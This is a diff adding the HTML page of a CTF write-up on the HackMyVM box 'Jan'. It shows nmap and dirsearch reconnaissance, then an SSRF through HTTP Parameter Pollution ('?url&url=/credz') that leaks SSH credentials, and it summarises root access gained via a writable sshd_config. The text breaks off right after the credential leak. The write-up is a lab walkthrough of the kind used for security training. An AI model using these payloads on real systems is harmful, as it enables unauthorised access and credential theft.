@@ -1,0 +1,2049 @@
+
+
+
+
+
+
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="true"
+><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#0e174e" />
+  
+  <title>Jan — HackMyVM &middot; k40t1k</title>
+    <meta name="title" content="Jan — HackMyVM &middot; k40t1k" />
+  
+  
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="http://localhost:1313/js/appearance.min.8a082f81b27f3cb2ee528df0b0bdc39787034cf2cc34d4669fbc9977c929023c.js"
+    integrity="sha256-iggvgbJ/PLLuUo3wsL3Dl4cDTPLMNNRmn7yZd8kpAjw="
+  ></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="http://localhost:1313/css/main.bundle.min.77a79972dfd1fba3e37eaab972e5cf479aea24376fc39d827f5760735ebc834e.css"
+    integrity="sha256-d6eZct/R&#43;6Pjfqq5cuXPR5rqJDdvw52Cf1dgc168g04="
+  />
+  
+  
+  
+  
+  
+  
+  
+  <meta
+    name="description"
+    content="
+      
+        
+      
+    "
+  />
+  
+  
+  
+  
+    <link rel="canonical" href="http://localhost:1313/posts/jan-hackmyvm/" />
+  
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+    <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="http://localhost:1313/posts/jan-hackmyvm/">
+	<meta property="og:site_name" content="k40t1k">
+	<meta property="og:title" content="Jan — HackMyVM">
+	<meta property="og:description" content="My awesome website">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="posts">
+		<meta property="article:published_time" content="2026-09-03T20:15:00+03:00">
+		<meta property="article:modified_time" content="2026-09-03T20:15:00+03:00">
+		<meta property="article:tag" content="HackMyVM">
+		<meta property="article:tag" content="Linux">
+		<meta property="article:tag" content="Easy">
+		<meta property="article:tag" content="SSRF">
+		<meta property="article:tag" content="HTTP Parameter Pollution">
+		<meta property="article:tag" content="SSH">
+		<meta property="og:image" content="http://localhost:1313/posts/jan-hackmyvm/feature.png">
+
+  
+	<meta name="twitter:card" content="summary_large_image">
+	<meta name="twitter:image" content="http://localhost:1313/posts/jan-hackmyvm/feature.png">
+	<meta name="twitter:title" content="Jan — HackMyVM">
+	<meta name="twitter:description" content="My awesome website">
+
+  
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Blog",
+    "name": "Jan — HackMyVM",
+    "headline": "Jan — HackMyVM",
+    
+    
+    "inLanguage": "en",
+    "url" : "http:\/\/localhost:1313\/posts\/jan-hackmyvm\/",
+    "author" : {
+      "@type": "Person",
+      "name": "k40t1k"
+    },
+    "copyrightYear": "2026",
+    "dateCreated": "2026-09-03T20:15:00\u002b03:00",
+    "datePublished": "2026-09-03T20:15:00\u002b03:00",
+    
+    "dateModified": "2026-09-03T20:15:00\u002b03:00",
+    
+    "keywords": ["HackMyVM","Linux","Easy","SSRF","HTTP Parameter Pollution","SSH","Command Injection","Privilege Escalation","SSH Config Misconfiguration","CTF Writeup"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "1407"
+  }
+  </script>
+    
+    <script type="application/ld+json">
+    {
+   "@context": "https://schema.org",
+   "@type": "BreadcrumbList",
+   "itemListElement": [
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/",
+       "name": "K40t1k",
+       "position": 1
+     },
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/posts/",
+       "name": "Blog",
+       "position": 2
+     },
+     {
+       "@type": "ListItem",
+       "name": "Jan — Hack My Vm",
+       "position": 3
+     }
+   ]
+ }
+  </script>
+
+  
+  
+    <meta name="author" content="k40t1k" />
+  
+  
+    
+      <link href="https://github.com/jkilonzi" rel="me" />
+    
+      <link href="https://linkedin.com/in/john-maluki" rel="me" />
+    
+      <link href="https://medium.com/@jkilonzi301" rel="me" />
+    
+  
+  
+  
+
+
+
+
+
+
+
+  
+  
+
+  
+  
+</head>
+<body
+    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
+  >
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
+        >Skip to main content</a
+      >
+    </div>
+    
+    
+      <header class="py-6 font-semibold text-neutral-900 dark:text-neutral sm:py-10 print:hidden">
+  <nav class="flex items-start justify-between sm:items-center">
+    
+    <div class="flex flex-row items-center">
+      
+  <a
+    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+    rel="me"
+    href="/"
+    >k40t1k</a
+  >
+
+    </div>
+    
+    
+      <ul class="flex list-none flex-col text-end sm:flex-row">
+        
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/about/"
+                  title="About"
+                  
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >About</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/posts/"
+                  title="Blog"
+                  
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Writeups</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/resources/"
+                  title="Resources"
+                  
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Resources</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/certificates/"
+                  title="Certificates"
+                  
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Certificates</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                
+                
+              
+            </li>
+          
+          
+        
+      </ul>
+    
+  </nav>
+</header>
+
+    
+    <div class="relative flex grow flex-col">
+      <main id="main-content" class="grow">
+        
+  <article>
+    <header class="max-w-prose">
+      
+      <h1 class="mb-8 mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        Jan — HackMyVM
+      </h1>
+      
+        <div class="mb-10 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+          
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2026-09-03 20:15:00 &#43;0300 EAT">3 September 2026</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">7 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+  
+
+
+        </div>
+      
+      
+        <div class="prose">
+          
+          
+          
+          
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mb-6 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/jan-hackmyvm/feature_hu_7255f4d443e3964c.webp 330w,http://localhost:1313/posts/jan-hackmyvm/feature_hu_d8669c29fac11026.webp 660w
+            
+              
+                ,http://localhost:1313/posts/jan-hackmyvm/feature_hu_7f9595dc8c1b10e7.webp 689w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/jan-hackmyvm/feature_hu_7f9595dc8c1b10e7.webp 689w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="689"
+        height="461"
+        class="mb-6 rounded-md"
+        
+        
+        
+          src="http://localhost:1313/posts/jan-hackmyvm/feature_hu_295a90ce3850b2df.png" srcset="http://localhost:1313/posts/jan-hackmyvm/feature_hu_2a9ceff602cc4faf.png 330w,http://localhost:1313/posts/jan-hackmyvm/feature_hu_295a90ce3850b2df.png 660w
+          
+            ,http://localhost:1313/posts/jan-hackmyvm/feature.png 689w
+          
+          
+            ,http://localhost:1313/posts/jan-hackmyvm/feature.png 689w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+          
+        </div>
+      
+    </header>
+    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
+      
+        <div class="order-first px-0 lg:order-last lg:max-w-xs lg:ps-8 self-start">
+          <div class="toc pe-5 sticky top-20 overflow-y-auto max-h-[calc(100vh-6rem)] print:hidden">
+            <details open class="-ms-5 mt-0 overflow-hidden rounded-lg ps-5">
+  <summary
+    class="block cursor-pointer bg-neutral-100 py-1 ps-5 text-lg font-semibold text-neutral-800 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden"
+  >
+    Table of Contents
+  </summary>
+  <div class="border-s border-dotted border-neutral-300 py-2 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#step-1-reconnaissance-and-enumeration">Step 1: Reconnaissance and Enumeration</a>
+      <ul>
+        <li><a href="#ssh">SSH</a></li>
+        <li><a href="#http">HTTP</a></li>
+        <li><a href="#exploring-the-redirect">Exploring the Redirect</a></li>
+        <li><a href="#http-parameter-pollution">HTTP Parameter Pollution</a></li>
+      </ul>
+    </li>
+    <li><a href="#step-2-initial-access">Step 2: Initial Access</a></li>
+    <li><a href="#step-3-enumeration-as-ssh">Step 3: Enumeration as ssh</a></li>
+    <li><a href="#step-4-privilege-escalation">Step 4: Privilege Escalation</a>
+      <ul>
+        <li><a href="#failed-command-injection">Failed Command Injection</a></li>
+        <li><a href="#ssh-config-abuse">SSH Config Abuse</a></li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+          </div>
+        </div>
+      
+      <div class="min-h-0 min-w-0 max-w-prose grow">
+        <h2 id="overview" class="relative group">Overview <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#overview" aria-label="Anchor">#</a></span></h2><p>Jan is a HackMyVM box that chains an SSRF on an open proxy with an SSH configuration weakness to reach root. The web service on port 8080 behaved like a proxy to an internal endpoint, and the <code>/redirect</code> handler was vulnerable to HTTP Parameter Pollution, leaking credentials that granted SSH access. After confirming the <code>ssh</code> user could run <code>service sshd restart</code> via sudo with no password, I abused a world-writable <code>sshd_config</code> to enable root login with a key I generated.</p>
+<h2 id="step-1-reconnaissance-and-enumeration" class="relative group">Step 1: Reconnaissance and Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-1-reconnaissance-and-enumeration" aria-label="Anchor">#</a></span></h2><p>The assessment began with an nmap scan against the target IP (192.168.56.111) to identify running services.</p>
+<pre tabindex="0"><code>nmap -sV -sC -p- 192.168.56.111
+</code></pre><pre tabindex="0"><code>PORT     STATE SERVICE REASON         VERSION
+22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 9.9 (protocol 2.0)
+| ssh-hostkey: 
+|   256 2c:0b:57:a2:b3:e2:0f:6a:c0:61:f2:b7:1f:56:b4:42 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHsZR0525oJX6FinfDet0UiRBNem8JeMieLtK4aTPA8IitARqNlpxoImW5Hx1zmUOmcmQLguU32H+4Ki5FNWka8=
+|   256 45:97:b0:2b:48:9b:4a:36:8e:db:44:bd:3f:15:cf:32 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKXdRCAzp4NQHOaCdp16oiQXHBfsVax3i+vY2La6CoBA
+8080/tcp open  http    syn-ack ttl 64 Golang net/http server
+|_http-open-proxy: Proxy might be redirecting requests
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-favicon: Unknown favicon MD5: E58BCC73ED281AC1BBC18405DE40325C
+|_http-title: Site doesn&#39;t have a title (text/plain; charset=utf-8).
+| fingerprint-strings: 
+|   FourOhFourRequest, GetRequest, HTTPOptions: 
+|     HTTP/1.0 200 OK
+|     Date: Tue, 25 Aug 2026 15:59:37 GMT
+|     Content-Length: 45
+|     Content-Type: text/plain; charset=utf-8
+|     Welcome to our Public Server. Maybe Internal.
+|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   OfficeScan: 
+|     HTTP/1.1 400 Bad Request: missing required Host header
+</code></pre><p><strong>Key Findings:</strong></p>
+<ul>
+<li>SSH (22) is running OpenSSH 9.9 with password authentication enabled.</li>
+<li>HTTP (8080) is served by a Golang <code>net/http</code> server that appears to be an open proxy to an internal service.</li>
+</ul>
+<h3 id="ssh" class="relative group">SSH <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#ssh" aria-label="Anchor">#</a></span></h3><p>The SSH service on port 22 has password authentication enabled.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/jan-hackmyvm/ssh-port_hu_c6c88d7bc93a392b.webp 330w,http://localhost:1313/posts/jan-hackmyvm/ssh-port_hu_447b3cf1a35f5c4a.webp 660w
+            
+              
+                ,http://localhost:1313/posts/jan-hackmyvm/ssh-port_hu_69f6683e250b4b6.webp 694w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/jan-hackmyvm/ssh-port_hu_69f6683e250b4b6.webp 694w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="694"
+        height="119"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/jan-hackmyvm/ssh-port_hu_d2ca007fe6f0de81.png" srcset="http://localhost:1313/posts/jan-hackmyvm/ssh-port_hu_a17946059367e904.png 330w,http://localhost:1313/posts/jan-hackmyvm/ssh-port_hu_d2ca007fe6f0de81.png 660w
+          
+            ,http://localhost:1313/posts/jan-hackmyvm/ssh-port.png 694w
+          
+          
+            ,http://localhost:1313/posts/jan-hackmyvm/ssh-port.png 694w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h3 id="http" class="relative group">HTTP <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#http" aria-label="Anchor">#</a></span></h3><p>Visiting the web server on port 8080 did not expose much, hinting that this is just a proxy to an internal service or endpoint.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/jan-hackmyvm/web-homepage_hu_3884974cce9d1844.webp 330w,http://localhost:1313/posts/jan-hackmyvm/web-homepage_hu_5fbab4e8d313739b.webp 660w
+            
+              
+                ,http://localhost:1313/posts/jan-hackmyvm/web-homepage_hu_c345568b9e6db3fe.webp 1015w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/jan-hackmyvm/web-homepage_hu_c345568b9e6db3fe.webp 1015w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1015"
+        height="280"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/jan-hackmyvm/web-homepage_hu_4fdca8d3ba603fbc.png" srcset="http://localhost:1313/posts/jan-hackmyvm/web-homepage_hu_ffa905dddaa3da00.png 330w,http://localhost:1313/posts/jan-hackmyvm/web-homepage_hu_4fdca8d3ba603fbc.png 660w
+          
+            ,http://localhost:1313/posts/jan-hackmyvm/web-homepage.png 1015w
+          
+          
+            ,http://localhost:1313/posts/jan-hackmyvm/web-homepage.png 1015w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>I checked to see if the site has a <code>robots.txt</code> file, which revealed two endpoints.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/jan-hackmyvm/robots-txt_hu_fc780f5cd25b4858.webp 330w,http://localhost:1313/posts/jan-hackmyvm/robots-txt_hu_2abf7a8668a179e.webp 660w
+            
+              
+                ,http://localhost:1313/posts/jan-hackmyvm/robots-txt_hu_49e08dbb71973d0e.webp 792w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/jan-hackmyvm/robots-txt_hu_49e08dbb71973d0e.webp 792w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="792"
+        height="189"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/jan-hackmyvm/robots-txt_hu_55771c857f7f7e38.png" srcset="http://localhost:1313/posts/jan-hackmyvm/robots-txt_hu_d865753625f67cb4.png 330w,http://localhost:1313/posts/jan-hackmyvm/robots-txt_hu_55771c857f7f7e38.png 660w
+          
+            ,http://localhost:1313/posts/jan-hackmyvm/robots-txt.png 792w
+          
+          
+            ,http://localhost:1313/posts/jan-hackmyvm/robots-txt.png 792w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>I tried directory brute-forcing with <strong>Gobuster</strong> and <strong>Feroxbuster</strong>, but neither was successful, so I switched to <strong>dirsearch</strong> using its default wordlist.</p>
+<pre tabindex="0"><code>dirsearch -u http://192.168.56.111:8080/
+</code></pre><p>Using this I discovered the following paths.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/jan-hackmyvm/dirsearch-scan_hu_2791b5c3ca3d9b5e.webp 330w,http://localhost:1313/posts/jan-hackmyvm/dirsearch-scan_hu_b305642f8130d794.webp 660w
+            
+              
+                ,http://localhost:1313/posts/jan-hackmyvm/dirsearch-scan_hu_bb939646b1e60358.webp 892w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/jan-hackmyvm/dirsearch-scan_hu_bb939646b1e60358.webp 892w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="892"
+        height="299"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/jan-hackmyvm/dirsearch-scan_hu_8a745dfc21cc7af1.png" srcset="http://localhost:1313/posts/jan-hackmyvm/dirsearch-scan_hu_e1d859943d852e7b.png 330w,http://localhost:1313/posts/jan-hackmyvm/dirsearch-scan_hu_8a745dfc21cc7af1.png 660w
+          
+            ,http://localhost:1313/posts/jan-hackmyvm/dirsearch-scan.png 892w
+          
+          
+            ,http://localhost:1313/posts/jan-hackmyvm/dirsearch-scan.png 892w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>The <code>/redirect</code> endpoint responds that the parameter <code>url</code> is needed, while the <code>/credz</code> endpoint says it is only accessible internally.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/jan-hackmyvm/redirect-endpoint_hu_5e3c48431f383944.webp 330w,http://localhost:1313/posts/jan-hackmyvm/redirect-endpoint_hu_8e4915c56a6a13b5.webp 660w
+            
+              
+                ,http://localhost:1313/posts/jan-hackmyvm/redirect-endpoint_hu_137217ba220388c1.webp 1018w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/jan-hackmyvm/redirect-endpoint_hu_137217ba220388c1.webp 1018w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1018"
+        height="208"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/jan-hackmyvm/redirect-endpoint_hu_9911a67b4a1515b0.png" srcset="http://localhost:1313/posts/jan-hackmyvm/redirect-endpoint_hu_7854f030c2bc4a9f.png 330w,http://localhost:1313/posts/jan-hackmyvm/redirect-endpoint_hu_9911a67b4a1515b0.png 660w
+          
+            ,http://localhost:1313/posts/jan-hackmyvm/redirect-endpoint.png 1018w
+          
+          
+            ,http://localhost:1313/posts/jan-hackmyvm/redirect-endpoint.png 1018w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/jan-hackmyvm/credz-internal_hu_91df4c4fd9847de.webp 330w,http://localhost:1313/posts/jan-hackmyvm/credz-internal_hu_6bec9501a15351b8.webp 660w
+            
+              
+                ,http://localhost:1313/posts/jan-hackmyvm/credz-internal_hu_cff324b3584b0444.webp 732w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/jan-hackmyvm/credz-internal_hu_cff324b3584b0444.webp 732w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="732"
+        height="140"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/jan-hackmyvm/credz-internal_hu_d967d6ab55cea8bb.png" srcset="http://localhost:1313/posts/jan-hackmyvm/credz-internal_hu_3e79d96231745fb0.png 330w,http://localhost:1313/posts/jan-hackmyvm/credz-internal_hu_d967d6ab55cea8bb.png 660w
+          
+            ,http://localhost:1313/posts/jan-hackmyvm/credz-internal.png 732w
+          
+          
+            ,http://localhost:1313/posts/jan-hackmyvm/credz-internal.png 732w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Visiting the other pages discovered using dirsearch redirected back to the landing page. I decided to explore the redirect, since it behaves like it requires a <code>url</code> parameter to be passed to it.</p>
+<h3 id="exploring-the-redirect" class="relative group">Exploring the Redirect <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#exploring-the-redirect" aria-label="Anchor">#</a></span></h3><p>I used this URL in the browser, and it responded asking for the <code>url</code> parameter: <em>&ldquo;Parameter &lsquo;url&rsquo; needed.&rdquo;</em></p>
+<pre tabindex="0"><code>http://192.168.56.111:8080/redirect?url=/Citrix/AccessPlatform/auth/clientscripts/cookies.js
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/jan-hackmyvm/redirect-url-param_hu_a9b337599b21a396.webp 330w,http://localhost:1313/posts/jan-hackmyvm/redirect-url-param_hu_61640bc6f64352b3.webp 660w
+            
+              
+                ,http://localhost:1313/posts/jan-hackmyvm/redirect-url-param_hu_37840021dc8ccd1.webp 875w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/jan-hackmyvm/redirect-url-param_hu_37840021dc8ccd1.webp 875w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="875"
+        height="124"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/jan-hackmyvm/redirect-url-param_hu_2d943889f4901e36.png" srcset="http://localhost:1313/posts/jan-hackmyvm/redirect-url-param_hu_5cb3be9da7e4bbd5.png 330w,http://localhost:1313/posts/jan-hackmyvm/redirect-url-param_hu_2d943889f4901e36.png 660w
+          
+            ,http://localhost:1313/posts/jan-hackmyvm/redirect-url-param.png 875w
+          
+          
+            ,http://localhost:1313/posts/jan-hackmyvm/redirect-url-param.png 875w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>I changed the URL and included <code>url=</code>, and now it responds with <em>&ldquo;Only accessible internally&rdquo;</em> — it behaves like a proxy that forwards to an internal resource.</p>
+<pre tabindex="0"><code>http://192.168.56.111:8080/redirect?url=/Citrix/AccessPlatform/auth/clientscripts/cookies.js
+</code></pre><p>So I decided to look for a way to access the internal endpoints, since it could be potentially vulnerable to <strong>SSRF</strong>.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/jan-hackmyvm/internal-access_hu_bda82e8ecb9ea6f1.webp 330w,http://localhost:1313/posts/jan-hackmyvm/internal-access_hu_e707763950b887f7.webp 660w
+            
+              
+                ,http://localhost:1313/posts/jan-hackmyvm/internal-access_hu_28c570c2d22b6724.webp 975w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/jan-hackmyvm/internal-access_hu_28c570c2d22b6724.webp 975w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="975"
+        height="121"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/jan-hackmyvm/internal-access_hu_54bcaae1fd013e5a.png" srcset="http://localhost:1313/posts/jan-hackmyvm/internal-access_hu_9e80499ebb0e3c2a.png 330w,http://localhost:1313/posts/jan-hackmyvm/internal-access_hu_54bcaae1fd013e5a.png 660w
+          
+            ,http://localhost:1313/posts/jan-hackmyvm/internal-access.png 975w
+          
+          
+            ,http://localhost:1313/posts/jan-hackmyvm/internal-access.png 975w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h3 id="http-parameter-pollution" class="relative group">HTTP Parameter Pollution <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#http-parameter-pollution" aria-label="Anchor">#</a></span></h3><p>Adding <code>&amp;url</code> made the message disappear — the trick was to pass the <code>url</code> parameter empty first, then supply it again, a form of <strong>HTTP Parameter Pollution</strong> (HPP).</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/jan-hackmyvm/url-param-dup_hu_a8800374b777120.webp 330w,http://localhost:1313/posts/jan-hackmyvm/url-param-dup_hu_747f5d523cf0cb0f.webp 660w
+            
+              ,http://localhost:1313/posts/jan-hackmyvm/url-param-dup_hu_9aeaa6bfae03ccfc.webp 1024w
+            
+            
+              
+                ,http://localhost:1313/posts/jan-hackmyvm/url-param-dup_hu_493684933de9b7eb.webp 1186w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1186"
+        height="206"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/jan-hackmyvm/url-param-dup_hu_72e07feccd2950d.png" srcset="http://localhost:1313/posts/jan-hackmyvm/url-param-dup_hu_4aeaa0d3a2370cb3.png 330w,http://localhost:1313/posts/jan-hackmyvm/url-param-dup_hu_72e07feccd2950d.png 660w
+          
+            ,http://localhost:1313/posts/jan-hackmyvm/url-param-dup_hu_d03f390761a9fcca.png 1024w
+          
+          
+            ,http://localhost:1313/posts/jan-hackmyvm/url-param-dup.png 1186w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>So I decided to use <code>?url&amp;url=/credz</code>, and it responded with <code>ssh</code> and a string that could be potentially the user password.</p>
+<pre tabindex="0"><code>http://192.168.56.111:8080/redirect?url&amp;url=/credz
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
